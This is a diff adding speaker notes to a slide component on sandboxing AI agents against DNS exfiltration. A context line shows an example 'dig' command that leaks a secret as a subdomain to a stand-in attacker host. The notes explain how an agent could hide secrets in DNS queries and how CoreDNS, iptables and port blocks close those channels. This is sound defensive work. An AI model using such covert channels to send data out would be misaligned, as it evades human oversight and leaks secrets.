@@ -35,6 +35,22 @@ dig @attacker.io +tls secret.attacker.io`}</code></pre>
         ⚠️ Current limitation: DNS policy is <strong>zone-based</strong>, not exact-host-based. Allowing
         <code> github.com </code> at the HTTP layer can still permit lookups under the <code>github.com</code> zone.
       </div>
+      <aside className="notes">
+        DNS is a classic covert channel that bypasses HTTP-level controls entirely.
+        An agent can encode secrets as subdomain labels, small UDP queries that are
+        invisible to mitmproxy.
+
+        The CoreDNS Corefile is generated at image build time from the same allow-list.yaml
+        that mitmproxy uses. HTTP and DNS policy share a single source of truth.
+
+        iptables ensures CoreDNS is the only process that can reach Docker's internal
+        resolver directly. Everything else is redirected to CoreDNS first.
+
+        DNS-over-TLS on port 853 is an encrypted DNS channel that would bypass CoreDNS
+        entirely. Port 853 is explicitly rejected outbound.
+
+        QUIC is blocked for the same reason as in HTTP, UDP 443 bypasses TCP interception.
+      </aside>
     </div>
   )
 }
